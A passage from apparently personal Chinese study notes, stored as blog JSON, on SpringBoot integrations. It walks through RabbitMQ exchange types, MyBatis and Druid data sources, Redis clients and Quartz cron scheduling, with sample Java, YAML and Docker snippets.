5672 # 端口\n    virtual-host: / # 虚拟主机\n    username: jianjian # 用户名\n    password: 123321 # 密码\n```\n\n然后在publisher服务中编写测试类SpringAmqpTest，并利用RabbitTemplate实现消息发送：\n\n```java\n@SpringBootTest\npublic class SpringAmqpTest {\n\n    @Autowired\n    private RabbitTemplate rabbitTemplate;\n\n    @Test\n    public void testSimpleQueue() {\n        // 队列名称\n        String queueName = \"simple.queue\";\n        // 消息\n        String message = \"hello, spring amqp!\";\n        // 发送消息\n        rabbitTemplate.convertAndSend(queueName, message);\n    }\n}\n```\n\n#### ⓷消息接收\n\n首先配置MQ地址，在consumer服务的application.yml中添加配置：\n\n```yaml\nspring:\n  rabbitmq:\n    host: 127.0.0.1 # 主机名\n    port: 5672 # 端口\n    virtual-host: / # 虚拟主机\n    username: jianjian # 用户名\n    password: 123321 # 密码\n```\n\n然后在consumer服务的`cn.jianjian.mq.listener`包中新建一个类SpringRabbitListener，代码如下：\n\n```java\n@Component\npublic class SpringRabbitListener {\n\n    @RabbitListener(queues = \"simple.queue\")\n    public void listenSimpleQueueMessage(String msg) throws InterruptedException {\n        System.out.println(\"spring 消费者接收到消息：【\" + msg + \"】\");\n    }\n}\n```\n\n#### ⓸测试\n\n启动consumer服务，然后在publisher服务中运行测试代码，发送MQ消息\n\n### ➌WorkQueue\n\nWork queues 也被称为 Task queues。简单来说就是**让多个消费者绑定到一个队列，共同消费队列中的消息**。\n\n![](https://img.jwt1399.top/img/202210061946056.png)\n\n当消息处理比较耗时的时候，则生产消息的速度会远远大于消息的消费速度。长此以往，消息就会堆积越来越多，无法及时处理。此时就可以使用 work 模型，多个消费者共同处理消息处理，速度就能大大提高了。\n\n#### ⓵消息发送\n\n这次我们循环发送，模拟大量消息堆积现象。在publisher服务中的SpringAmqpTest类中添加一个测试方法：\n\n```java\n@Test\npublic void testWorkQueue() throws InterruptedException {\n    // 队列名称\n    String queueName = \"simple.queue\";\n    // 消息\n    String message = \"hello, message_\";\n    for (int i = 0; i < 50; i++) {\n        // 发送消息\n        rabbitTemplate.convertAndSend(queueName, message + i);\n        Thread.sleep(20);// 避免发送太快\u000b\n    }\n}\n```\n\n#### ⓶消息接收\n\n要模拟多个消费者绑定同一个队列，我们在consumer服务的SpringRabbitListener中添加2个新的方法：\n\n```java\n@RabbitListener(queues = \"simple.queue\")\npublic void listenWorkQueue1(String msg) throws InterruptedException {\n    System.out.println(\"消费者1接收到消息：【\" + msg + \"】\" + LocalTime.now());\n    Thread.sleep(20);//模拟任务耗时\n}\n\n@RabbitListener(queues = \"simple.queue\")\npublic void listenWorkQueue2(String msg) throws InterruptedException {\n    System.err.println(\"消费者2........接收到消息：【\" + msg + \"】\" + LocalTime.now());\n    Thread.sleep(200);\n}\n```\n\n#### ⓷测试\n\n启动ConsumerApplication后，再执行publisher服务中刚刚编写的测试方法testWorkQueue。\n\n可以看到消费者1很快完成了自己的25条消息。消费者2却在缓慢的处理自己的25条消息。\n\n也就是说消息是平均分配给每个消费者，并没有考虑到消费者的处理能力。这样显然是有问题的。\n\n#### ⓸消费预取限制\n\n通过配置可以解决上述问题。修改consumer服务的application.yml文件，设置preFetch值，可以控制预取消息的上限\n\n```yaml\nspring:\n  rabbitmq:\n    listener:\n      simple:\n        prefetch: 1 # 每次只能获取一条消息，处理完成才能获取下一个消息\n```\n\n#### ⓹总结\n\n- 多个消费者绑定到一个队列，同一条消息只会被一个消费者处理\n- 通过设置prefetch来控制消费者预取的消息数量\n\n### ➍Publish/Subscribe\n\n发布订阅模式的区别就是允许将同一消息发送给多个消费者。实现方式是加入了exchange（交换机）。\n\n![发布订阅模型](https://img.jwt1399.top/img/202210062001172.png)\n\n\n\n- Publisher：生产者，也就是要发送消息的程序，但是不再发送到队列中，而是发给交换机\n- Consumer：消费者，与以前一样，订阅队列，没有变化\n- Queue：消息队列也与以前一样，接收消息、缓存消息。\n- Exchange：交换机，一方面，接收生产者发送的消息。另一方面，知道如何处理消息，例如递交给某个特别队列、递交给所有队列、或是将消息丢弃。到底如何操作，取决于Exchange的类型。Exchange有以下3种类型：\n  - Fanout：广播，将消息交给所有绑定到交换机的队列\n  - Direct：定向，把消息交给符合指定routing key 的队列\n  - Topic：通配符，把消息交给符合routing pattern（路由模式） 的队列\n\n**Exchange（交换机）只负责转发消息，不具备存储消息的能力**，因此如果没有任何队列与Exchange绑定，或者没有符合路由规则的队列，那么消息会丢失！\n\n#### ➀Fanout\n\n![](https://img.jwt1399.top/img/202210071521150.png)\n\n在广播模式下，消息发送流程是这样的：\n\n- 1）  可以有多个队列\n- 2）  每个队列都要绑定到 exchange（交换机）\n- 3）  生产者发送的消息，只能发送到交换机，交换机来决定要发给哪个队列，生产者无法决定\n- 4）  交换机把消息发送给绑定过的所有队列\n- 5）  订阅队列的消费者都能拿到消息\n\n**案例**\n\n- 创建一个交换机 jianjian.fanout，类型是 Fanout\n- 创建两个队列fanout.queue1和fanout.queue2，绑定到交换机 jianjian.fanout\n\n##### ➀声明队列和交换机\n\nSpring提供了一个接口Exchange，来表示所有不同类型的交换机：\n\n![](https://img.jwt1399.top/img/202210071521480.png)\n\n在consumer中创建一个类，声明队列和交换机：\n\n```java\n@Configuration\npublic class FanoutConfig {\n    /**\n     * 声明交换机\n     * @return Fanout类型交换机\n     */\n    @Bean\n    public FanoutExchange fanoutExchange(){\n        return new FanoutExchange(\"jianjian.fanout\");\n    }\n\n    /**\n     * 第1个队列\n     */\n    @Bean\n    public Queue fanoutQueue1(){\n        return new Queue(\"fanout.queue1\");\n    }\n\n    /**\n     * 绑定队列和交换机\n     */\n    @Bean\n    public Binding bindingQueue1(Queue fanoutQueue1, FanoutExchange fanoutExchange){\n        return BindingBuilder.bind(fanoutQueue1).to(fanoutExchange);\n    }\n\n    /**\n     * 第2个队列\n     */\n    @Bean\n    public Queue fanoutQueue2(){\n        return new Queue(\"fanout.queue2\");\n    }\n\n    /**\n     * 绑定队列和交换机\n     */\n    @Bean\n    public Binding bindingQueue2(Queue fanoutQueue2, FanoutExchange fanoutExchange){\n        return BindingBuilder.bind(fanoutQueue2).to(fanoutExchange);\n    }\n}\n```\n\n##### ➁消息发送\n\n在publisher服务的SpringAmqpTest类中添加测试方法：\n\n```java\n@Test\npublic void testFanoutExchange() {\n    // 队列名称\n    String exchangeName = \"jianjian.fanout\";\n    // 消息\n    String message = \"hello, everyone!\";\n    rabbitTemplate.convertAndSend(exchangeName, \"\", message);\n}\n```\n\n##### ➂消息接收\n\n在consumer服务的SpringRabbitListener中添加两个方法，作为消费者：\n\n```java\n@RabbitListener(queues = \"fanout.queue1\")\npublic void listenFanoutQueue1(String msg) {\n    System.out.println(\"消费者1接收到Fanout消息：【\" + msg + \"】\");\n}\n\n@RabbitListener(queues = \"fanout.queue2\")\npublic void listenFanoutQueue2(String msg) {\n    System.out.println(\"消费者2接收到Fanout消息：【\" + msg + \"】\");\n}\n```\n\n##### ➃总结\n\n交换机的作用是什么？\n\n- 接收publisher发送的消息\n- 将消息按照规则路由到与之绑定的队列\n- 不能缓存消息，路由失败，消息丢失\n- FanoutExchange会将消息路由到每个绑定的队列\n\n声明队列、交换机、绑定关系的Bean是什么？\n\n- Queue\n- FanoutExchange\n- Binding\n\n#### ➁Direct\n\n在`Fanout`模式中，一条消息，会被所有订阅的队列都消费。但是，在某些场景下，我们希望不同的消息被不同的队列消费。这时就要用到`Direct`类型的exchange。\n\n![](https://img.jwt1399.top/img/202210071530068.png)\n\n 在Direct模型下：\n\n- 队列与交换机的绑定，不能是任意绑定了，而是要指定一个`RoutingKey`（路由key）\n- 消息的发送方在向 exchange发送消息时，也必须指定消息的 `RoutingKey`。\n- exchange不再把消息交给每一个绑定的队列，而是根据消息的`Routing Key`进行判断，只有队列的`Routingkey`与消息的 `Routing key`完全一致，才会接收到消息\n\n**案例**\n\n1. 利用@RabbitListener声明Exchange、Queue、RoutingKey\n\n2. 在consumer服务中，编写两个消费者方法，分别监听direct.queue1和direct.queue2\n\n3. 在publisher中编写测试方法，向jianjian. direct发送消息\n\n##### ➀基于注解声明队列和交换机\n\n基于@Bean的方式声明队列和交换机比较麻烦，Spring还提供了基于注解方式来声明。\n\n在consumer的SpringRabbitListener中添加两个消费者，同时基于注解来声明队列和交换机：\n\n```java\n@RabbitListener(bindings = @QueueBinding(\n    value = @Queue(name = \"direct.queue1\"),\n    exchange = @Exchange(name = \"jianjian.direct\", type = ExchangeTypes.DIRECT),\n    key = {\"red\", \"blue\"}\n))\npublic void listenDirectQueue1(String msg){\n    System.out.println(\"消费者接收到direct.queue1的消息：【\" + msg + \"】\");\n}\n\n@RabbitListener(bindings = @QueueBinding(\n    value = @Queue(name = \"direct.queue2\"),\n    exchange = @Exchange(name = \"jianjian.direct\", type = ExchangeTypes.DIRECT),\n    key = {\"red\", \"yellow\"}\n))\npublic void listenDirectQueue2(String msg){\n    System.out.println(\"消费者接收到direct.queue2的消息：【\" + msg + \"】\");\n}\n```\n\n##### ➁消息发送\n\n在publisher服务的SpringAmqpTest类中添加测试方法：\n\n```java\n@Test\npublic void testSendDirectExchange() {\n    // 交换机名称\n    String exchangeName = \"jianjian.direct\";\n    // 消息\n    String message = \"红色警报！日本乱排核废水，导致海洋生物变异，惊现哥斯拉！\";\n    // 发送消息\n    rabbitTemplate.convertAndSend(exchangeName, \"red\", message);\n}\n```\n\n##### ➂总结\n\n描述下Direct交换机与Fanout交换机的差异？\n\n- Fanout交换机将消息路由给每一个与之绑定的队列\n- Direct交换机根据RoutingKey判断路由给哪个队列\n- 如果多个队列具有相同的RoutingKey，则与Fanout功能类似\n\n基于@RabbitListener注解声明队列和交换机有哪些常见注解？\n\n- @Queue\n- @Exchange\n\n#### ➂Topic\n\n`Topic`与`Direct`相比，都是可以根据`RoutingKey`把消息路由到不同的队列。只不过`Topic`类型`exchange`可以让队列在绑定`Routing key` 的时候使用通配符！\n\n![](https://img.jwt1399.top/img/202210071539760.png)\n\n`Routingkey` 一般都是由一个或多个单词组成，多个单词之间以“`.`”分割，例如： `item.insert`\n\n 通配符规则：\n\n- `#`：匹配一个或多个词\n- `*`：匹配不多不少恰好1个词\n\n举例：\n\n`item.#`：能够匹配`item.spu.insert` 或者 `item.spu`\n\n`item.*`：只能匹配`item.spu`\n\n解释：\n\n- Queue1：绑定的是`china.#` ，因此凡是以 `china.`开头的`routing key` 都会被匹配到。包括china.news和china.weather\n- Queue2：绑定的是`#.news` ，因此凡是以 `.news`结尾的 `routing key` 都会被匹配。包括china.news和japan.news\n\n**案例**\n\n1. 并利用@RabbitListener声明Exchange、Queue、RoutingKey\n\n2. 在consumer服务中，编写两个消费者方法，分别监听topic.queue1和topic.queue2\n\n3. 在publisher中编写测试方法，向jianjian. topic发送消息\n\n##### ➀消息发送\n\n在publisher服务的SpringAmqpTest类中添加测试方法：\n\n```java\n@Test\npublic void testSendTopicExchange() {\n    // 交换机名称\n    String exchangeName = \"itcast.topic\";\n    // 消息\n    String message = \"喜报！孙悟空大战哥斯拉，胜!\";\n    // 发送消息\n    rabbitTemplate.convertAndSend(exchangeName, \"china.news\", message);\n}\n```\n\n##### ➁消息接收\n\n在consumer服务的SpringRabbitListener中添加方法：\n\n```java\n@RabbitListener(bindings = @QueueBinding(\n    value = @Queue(name = \"topic.queue1\"),\n    exchange = @Exchange(name = \"jianjian.topic\", type = ExchangeTypes.TOPIC),\n    key = \"china.#\"\n))\npublic void listenTopicQueue1(String msg){\n    System.out.println(\"消费者接收到topic.queue1的消息：【\" + msg + \"】\");\n}\n\n@RabbitListener(bindings = @QueueBinding(\n    value = @Queue(name = \"topic.queue2\"),\n    exchange = @Exchange(name = \"jianjian.topic\", type = ExchangeTypes.TOPIC),\n    key = \"#.news\"\n))\npublic void listenTopicQueue2(String msg){\n    System.out.println(\"消费者接收到topic.queue2的消息：【\" + msg + \"】\");\n}\n```\n\n##### ➂总结\n\n描述下Direct交换机与Topic交换机的差异？\n\n- Topic交换机接收的消息RoutingKey必须是多个单词，以 `.` 分割\n- Topic交换机与队列绑定时的bindingKey可以指定通配符\n  - `#`：代表0个或多个词\n  - `*`：代表1个词\n\n\n### ➑消息转换器\n\nSpring会把你发送的消息序列化为字节发送给MQ，接收消息的时候，还会把字节反序列化为Java对象。\n\n![](https://img.jwt1399.top/img/202210082150457.png)\n\n只不过，默认情况下Spring采用的序列化方式是JDK序列化。众所周知，JDK序列化存在下列问题：\n\n- 数据体积过大\n- 有安全漏洞\n- 可读性差\n\n#### ➀测试默认转换器\n\n我们修改消息发送的代码，发送一个Map对象：\n\n```java\n@Test\npublic void testSendMap() throws InterruptedException {\n    // 准备消息\n    Map<String,Object> msg = new HashMap<>();\n    msg.put(\"name\", \"Jack\");\n    msg.put(\"age\", 21);\n    // 发送消息\n    rabbitTemplate.convertAndSend(\"simple.queue\",\"\", msg);\n}\n```\n\n发送消息后查看控制台，可以看到消息很长，可读性差。\n\n![](https://img.jwt1399.top/img/202210082150423.png)\n\n#### ➁配置JSON转换器\n\n显然，JDK序列化方式并不合适。我们希望消息体的体积更小、可读性更高，因此可以使用JSON方式来做序列化和反序列化。\n\n在publisher和consumer两个服务中都引入jackson依赖：\n\n```xml\n<dependency>\n    <groupId>com.fasterxml.jackson.dataformat</groupId>\n    <artifactId>jackson-dataformat-xml</artifactId>\n    <version>2.9.10</version>\n</dependency>\n```\n\n配置消息转换器，在启动类中添加一个Bean即可：\n\n```java\n@Bean\npublic MessageConverter jsonMessageConverter(){\n    return new Jackson2JsonMessageConverter();\n}\n```\n\n# 10.elasticsearch\n\n\n\n\n\n\n\n# Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["SpringCloud"],"categories":["Spring"]},{"title":"SpringBoot-整合篇","url":"/posts/58591.html","content":"\n> 整合篇包含SpringBoot对各种第三方技术的整合。例如SQL、NoSQL、缓存、消息队列、定时任务、文档操作、认证授权、消息通知等等\n\n小简从 0 开始学 Java 知识之 [Java-学习路线](https://jwt1399.top/posts/29829.html) 中的《SpringBoot-整合篇》，不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 🚩时间安排：本篇长期更新\n- [x] 🎯开始时间：09-15\n- [x] 🎉结束时间：∞\n\n## 1.整合SQL\n\n### ①MyBatis\n\n**步骤①**：导入 MyBatis 的 starter 和对应数据库的坐标，或者创建项目时勾选要使用的技术\n\n```xml\n<dependency>\n    <groupId>org.mybatis.spring.boot</groupId>\n    <artifactId>mybatis-spring-boot-starter</artifactId>\n    <version>2.2.2</version>\n</dependency>\n\n<dependency>\n  <groupId>mysql</groupId>\n  <artifactId>mysql-connector-java</artifactId>\n  <scope>runtime</scope>\n</dependency>\n```\n\n**步骤②**：配置数据源相关信息，没有这个信息你连接哪个数据库都不知道\n\n```yaml\nspring:\n  datasource:\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=Asia/Shanghai\n    username: root\n    password: root\n```\n\n**测试**\n\n- 测试表\n\n```sql\nSET NAMES utf8;\nSET FOREIGN_KEY_CHECKS = 0;\n\n-- ----------------------------\n-- Table structure for tbl_book\n-- ----------------------------\nDROP TABLE IF EXISTS `tbl_book`;\nCREATE TABLE `tbl_book`  (\n  `id` int NOT NULL AUTO_INCREMENT,\n  `name` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `type` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `description` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  PRIMARY KEY (`id`) USING BTREE\n) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;\n\n-- ----------------------------\n-- Records of tbl_book\n-- ----------------------------\nINSERT INTO `tbl_book` VALUES (1, '三体', '科幻', '大刘的巅峰之作，将中国科幻推向世界舞台。总共分为三部曲：《地球往事》、《黑暗森林》、《死神永生》。');\nINSERT INTO `tbl_book` VALUES (2, '格林童话', '童话', '睡前故事。');\nINSERT INTO `tbl_book` VALUES (3, 'Spring 5设计模式', '计算机理论', '深入Spring源码剖析Spring源码中蕴含的10大设计模式');\n\nSET FOREIGN_KEY_CHECKS = 1;\n```\n\n- 实体类\n\n```java\npublic class Book {\n    private Integer id;\n    private String type;\n    private String name;\n    private String description;\n}\n```\n\n- 映射接口（Dao）\n\n```java\n@Mapper\npublic interface BookDao {\n    @Select(\"select * from tbl_book where id = #{id}\")\n    public Book getById(Integer id);\n}\n```\n\n- 测试类\n\n```java\n@SpringBootTest\nclass Springboot05MybatisApplicationTests {\n    @Autowired\n    private BookDao bookDao;\n    @Test\n    void contextLoads() {\n        System.out.println(bookDao.getById(1));\n    }\n}\n```\n\n**总结**\n\n1. 整合操作需要勾选MyBatis技术，也就是导入MyBatis对应的starter\n\n2. 数据库连接相关信息转换成配置\n\n3. 数据库SQL映射需要添加@Mapper被容器识别到\n\n4. MySQL 8.X驱动强制要求设置时区\n\n   - 修改url，添加serverTimezone设定\n   - 修改MySQL数据库配置：修改mysql中的配置文件mysql.ini，在mysqld项中添加default-time-zone=+8:00\n\n5. 驱动类过时，提醒更换为com.mysql.cj.jdbc.Driver\n\n### ②MyBatis-Plus\n\n**步骤①**：导入对应的 starter 和数据库驱动\n\n```xml\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>mybatis-plus-boot-starter</artifactId>\n    <version>3.4.3</version>\n</dependency>\n\n<dependency>\n  <groupId>mysql</groupId>\n  <artifactId>mysql-connector-java</artifactId>\n  <scope>runtime</scope>\n</dependency>\n```\n\n**步骤②**：配置数据源相关信息\n\n```yaml\nspring:\n  datasource:\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    url: jdbc:mysql://localhost:3306/ssm_db\n    username: root\n    password: root\n```\n\n**步骤③**：配置表名的通用前缀名\n\n数据库的表名定义规则是tbl_模块名称，为了能和实体类相对应，需要设置所有表名的通用前缀名\n\n```yaml\nmybatis-plus:\n  global-config:\n    db-config:\n      table-prefix: tbl_\t\t#设置所有表的通用前缀名称为tbl_\n```\n\n**步骤④**：配置运行日志\n\n通过配置运行日志就可以查阅执行时的SQL语句\n\n```yaml\nmybatis-plus:\n  global-config:\n    db-config:\n      table-prefix: tbl_\n      id-type: auto\n  configuration:\n    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl #配置日志\n```\n\n**测试**\n\n- 实体类\n\n```java\npublic class Book {\n    private Integer id;\n    private String type;\n    private String name;\n    private String description;\n}\n```\n\n- 映射接口（Dao）\n\n```java\n@Mapper\npublic interface BookDao extends BaseMapper<Book> {\n}\n```\n\n核心在于Dao接口继承了一个BaseMapper的接口，这个接口中帮助开发者预定了若干个常用的API接口，简化了通用API接口的开发工作。\n\n- 测试类\n\n```java\n@SpringBootTest\nclass SpringbootApplicationTests {\n    @Autowired\n    private BookDao bookDao;\n    @Test\n    void contextLoads() {\n        System.out.println(bookDao.selectById(2));\n        System.out.println(bookDao.selectList(null));\n    }\n}\n```\n\n**总结**\n\n1. 手工添加MyBatis-Plus对应的starter\n2. 数据层接口使用BaseMapper简化开发\n3. 借助MyBatis-Plus日志可以查阅执行SQL语句\n4. 需要使用的第三方技术无法通过勾选确定时，需要手工添加坐标\n\n### ③Durid\n\n前面整合 MyBatis 和 MyBatis-Plus 的时候，使用的数据源对象都是SpringBoot默认的数据源对象 HiKari，下面我们手工控制一下，自己指定了一个数据源对象 Druid。\n\n**步骤①**：导入对应的starter\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>com.alibaba</groupId>\n        <artifactId>druid-spring-boot-starter</artifactId>\n        <version>1.2.6</version>\n    </dependency>\n</dependencies>\n```\n\n**步骤②**：修改配置\n\n```yaml\nspring:\n  datasource:\n    druid:\n      driver-class-name: com.mysql.cj.jdbc.Driver\n      url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=UTC\n      username: root\n      password: root\n      \n#除了这4个常规配置外，还有druid专用的其他配置。通过提示功能可以打开druid相关的配置查阅\n```\n\n**总结**\n\n1. 整合Druid需要导入Druid对应的starter\n2. 根据Druid提供的配置方式进行配置\n\n## 2.整合NoSQL\n\n### ①Redis\n\n**步骤①**：导入对应的 starter 和依赖\n\n```xml\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-data-redis</artifactId>\n</dependency>\n```\n\n**步骤②**：修改配置\n\n```yaml\nspring:\n  redis:\n    host: 127.0.0.1 #指定redis所在的host\n    port: 6379  #指定redis的端口\n    password: 123456  #设置redis密码\n    lettuce:\n      pool:\n        max-active: 8 #最大连接数\n        max-idle: 8 #最大空闲数\n        min-idle: 0 #最小空闲数\n        max-wait: 100ms #连接等待时间\n```\n\n**步骤③**：使用springboot整合redis的专用客户端接口操作\n\n- RedisTemplate\n\n```java\n@SpringBootTest\nclass SpringRedisApplicationTests {\n    @Resource\n    private RedisTemplate redisTemplate;\n    @Test\n    void testString() {\n        // 1.通过RedisTemplate获取操作String类型的ValueOperations对象\n        ValueOperations ops = redisTemplate.opsForValue();\n        // 2.插入一条数据\n        ops.set(\"name\",\"jianjian\");\n        // 3.获取数据，需要进行类型转换\n        String name = (String) ops.get(\"name\");\n        System.out.println(\"name = \" + name);\n    }\n}\n```\n\n- StringRedisTemplate\n\n由于redis内部不提供java对象的存储格式，因此当操作的数据以对象的形式存在时，会进行转码，转换成字符串格式后进行操作。为了方便开发者使用基于字符串为数据的操作，springboot整合redis时提供了专用的API接口StringRedisTemplate，可以理解为这是RedisTemplate的一种指定数据泛型的操作API。\n\n```JAVA\n@SpringBootTest\npublic class StringRedisTemplateTest {\n    @Autowired\n    private StringRedisTemplate stringRedisTemplate;\n    @Test\n    void get(){\n        ValueOperations<String, String> ops = stringRedisTemplate.opsForValue();\n        String name = ops.get(\"name\");\n        System.out.println(name);\n    }\n}\n```\n\n**redis客户端选择**\n\n> springboot整合redis技术提供了多种客户端兼容模式，默认提供的是lettuce客户端技术，也可以根据需要切换成指定客户端技术，例如jedis客户端技术，切换成jedis客户端技术操作步骤如下：\n\n**步骤①**：导入jedis坐标\n\n```xml\n<dependency>\n    <groupId>redis.clients</groupId>\n    <artifactId>jedis</artifactId>\n</dependency>\n```\n\n**步骤②**：配置客户端技术类型，设置为jedis\n\n```yaml\nspring:\n  redis:\n    host: localhost\n    port: 6379\n    client-type: jedis\n```\n\n**步骤③**：根据需要设置对应的配置\n\n```yaml\nspring:\n  redis:\n    host: localhost\n    port: 6379\n    client-type: jedis\n    lettuce:\n      pool:\n        max-active: 16\n    jedis:\n      pool:\n        max-active: 16\n```\n\n**lettcus与jedis区别**\n\n- jedis连接Redis服务器是直连模式，当多线程模式下使用jedis会存在线程安全问题，解决方案可以通过配置连接池使每个连接专用，这样整体性能就大受影响\n- lettcus基于Netty框架进行与Redis服务器连接，底层设计中采用StatefulRedisConnection。 StatefulRedisConnection自身是线程安全的，可以保障并发访问安全问题，所以一个连接可以被多线程复用。当然lettcus也支持多连接实例一起工作\n\n### ②MongoDB\n\n\n\n### ③ES\n\n\n\n## 3.整合缓存\n\n### ①Ehcache\n\n### ②Redis\n\n### ③Memcached\n\n## 4.整合消息队列\n\n### ①ActiveMQ\n\n### ②RabbitMQ\n\n#### ❶安装RabbitMQ\n\n- 拉取镜像\n\n```bash\ndocker pull rabbitmq:3-management\n```\n\n- 运行镜像\n\n```bash\ndocker run \\\n -e RABBITMQ_DEFAULT_USER=jianjian \\\n -e RABBITMQ_DEFAULT_PASS=123321 \\\n --name mq \\\n --hostname mq1 \\\n -p 15672:15672 \\\n -p 5672:5672 \\\n -d rabbitmq:3-management\n```\n\n访问 `http://127.0.0.1:15672` 即可\n\n#### ❷引入依赖并配置\n\n导入springboot整合amqp的starter，amqp协议默认实现为rabbitmq方案\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-amqp</artifactId>\n</dependency>\n```\n\n配置RabbitMQ的服务器地址\n\n```yaml\nspring:\n  rabbitmq:\n    host: 127.0.0.1 # 主机名\n    port: 5672 # 端口\n    virtual-host: / # 虚拟主机\n    username: jianjian # 用户名\n    password: 123321 # 密码    \n```\n\n**案例**\n\n1. 利用@RabbitListener声明Exchange、Queue、RoutingKey\n2. 在consumer服务中，编写两个消费者方法，分别监听direct.queue1和direct.queue2\n3. 在publisher中编写测试方法，向jianjian. direct发送消息\n\n#### ❸消息接收(direct)\n\n在consumer的SpringRabbitListener中添加两个消费者，同时基于注解来声明队列和交换机：\n\n```java\n@Component\npublic class SpringRabbitListener {\n  \n    @RabbitListener(bindings = @QueueBinding(\n        value = @Queue(name = \"direct.queue1\"),\n        exchange = @Exchange(name = \"jianjian.direct\", type = ExchangeTypes.DIRECT),\n        key = {\"red\", \"blue\"}\n    ))\n    public void listenDirectQueue1(String msg){\n        System.out.println(\"消费者接收到direct.queue1的消息：【\" + msg + \"】\");\n    }\n\n    @RabbitListener(bindings = @QueueBinding(\n        value = @Queue(name = \"direct.queue2\"),\n        exchange = @Exchange(name = \"jianjian.direct\", type = ExchangeTypes.DIRECT),\n        key = {\"red\", \"yellow\"}\n    ))\n    public void listenDirectQueue2(String msg){\n        System.out.println(\"消费者接收到direct.queue2的消息：【\" + msg + \"】\");\n    }\n}\n```\n\n#### ❹消息发送(direct)\n\n在publisher服务中添加测试方法：\n\n```java\n@SpringBootTest\npublic class SpringAmqpTest {\n    @Test\n    public void testSendDirectExchange() {\n        // 交换机名称\n        String exchangeName = \"jianjian.direct\";\n        // 消息\n        String message = \"红色警报！日本乱排核废水，导致海洋生物变异，惊现哥斯拉！\";\n        // 发送消息\n        rabbitTemplate.convertAndSend(exchangeName, \"red\", message);\n    }\n}\n```\n\n### ③RocketMQ\n\n### ④kafka\n\n## 5.整合定时任务\n\n### ①Quartz\n\n> Quartz技术是一个比较成熟的定时任务框架。springboot对其进行整合后，简化了一系列的配置，将很多配置采用默认设置，这样开发阶段就简化了很多。\n>\n> Quartz相关概念\n>\n> - 工作（Job）：用于定义具体执行的工作\n> - 工作明细（JobDetail）：用于描述定时工作相关的信息\n> - 触发器（Trigger）：用于描述触发工作的执行规则，通常使用cron表达式定义规则\n> - 调度器（Scheduler）：描述了工作明细与触发器的对应关系\n>\n> 简单说就是你定时干什么事情，这就是工作；工作不可能就是一个简单的方法，还要设置一些明细信息；工作啥时候执行，设置一个触发器；工作和触发器都是独立定义的，它们两个怎么配合到一起呢？用调度器。\n\n**步骤①**：导入springboot整合Quartz的starter\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-quartz</artifactId>\n</dependency>\n```\n\n**步骤②**：定义任务Bean，按照Quartz的开发规范制作，继承QuartzJobBean\n\n```java\npublic class MyQuartz extends QuartzJobBean { //工作\n    @Override\n    protected void executeInternal(JobExecutionContext context) throws JobExecutionException {\n        System.out.println(\"quartz task run...\");\n    }\n}\n```\n\n**步骤③**：创建Quartz配置类，定义工作明细（JobDetail）与触发器的（Trigger）bean\n\n```java\n@Configuration\npublic class QuartzConfig {\n    @Bean\n    public JobDetail printJobDetail(){ //工作明细\n        //绑定具体的工作\n        return JobBuilder.newJob(MyQuartz.class).storeDurably().build();\n    }\n    @Bean\n    public Trigger printJobTrigger(){ //触发器\n        //调度器定义触发工作的执行规则 从0s开始每隔5s运行一次\n        ScheduleBuilder schedBuilder = CronScheduleBuilder.cronSchedule(\"0/5 * * * * ?\");\n        //绑定对应的工作明细\n        return TriggerBuilder.newTrigger().forJob(printJobDetail()).withSchedule(schedBuilder).build();\n    }\n}\n```\n\n**工作明细**中要设置对应的具体**工作**，使用newJob()操作传入对应的工作任务类型即可。\n\n**触发器**需要绑定任务，使用forJob()操作传入绑定的工作明细对象。此处可以为工作明细设置名称然后使用名称绑定，也可以直接调用对应方法绑定。\n\n触发器中最核心的规则是执行时间，此处使用**调度器**定义执行时间，执行时间描述方式使用的是`cron表达式`。\n\n**cron表达式详解**\n\n在spring 4.x中已经不支持7个参数的cron表达式了，要求必须是6个参数。cron表达式格式如下：\n\n```javascript\n{秒} {分} {时} {日期（具体哪天）} {月} {星期}\n```\n\n-   秒：必填项，允许的值范围是0-59，支持的特殊符号包括`,` `-` `*` `/`，\n    -   `,`表示特定的某一秒才会触发任务\n    -   `-`表示一段时间内会触发任务\n    -   `*`表示每一秒都会触发\n    -   `/`表示从哪一个时刻开始，每隔多长时间触发一次任务。\n-   分：必填项，允许的值范围是0-59，支持的特殊符号和秒一样，含义类推\n-   时：必填项，允许的值范围是0-23，支持的特殊符号和秒一样，含义类推\n-   日期：必填项，允许的值范围是1-31，支持的特殊符号相比秒多了`?`，表示与{星期}互斥，即意味着若明确指定{星期}触发，则表示{日期}无意义，以免引起冲突和混乱。\n-   月：必填项，允许的值范围是1-12 (JAN-DEC)，支持的特殊符号与秒一样，含义类推\n-   星期：必填项，允许值范围是1~7 (SUN-SAT)，1代表星期天（一星期的第一天），以此类推，7代表星期六，支持的符号相比秒多了`?`，表达的含义是与{日期}互斥，即意味着若明确指定{日期}触发，则表示{星期}无意义。\n\n**总结**\n\n1. 